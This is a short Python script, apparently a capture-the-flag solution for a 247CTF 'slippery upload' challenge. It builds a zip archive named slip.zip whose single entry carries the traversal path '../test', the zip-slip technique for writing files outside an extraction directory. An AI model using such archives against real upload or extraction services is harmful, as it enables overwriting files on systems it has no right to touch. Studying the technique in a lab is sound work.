#!/usr/bin/python3

##
## build_malicious_zip
## ## slippery -> https://www.secjuice.com/247ctf-slippery-upload-write-up/
################

import zipfile

from cStringIO import StringIO

def zip_up():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../test', 'test')
    zip = open('slip.zip', 'wb')
    zip.write(f.getvalue())
    zip.close()
    z.close()

zip_up()

################################
##
##
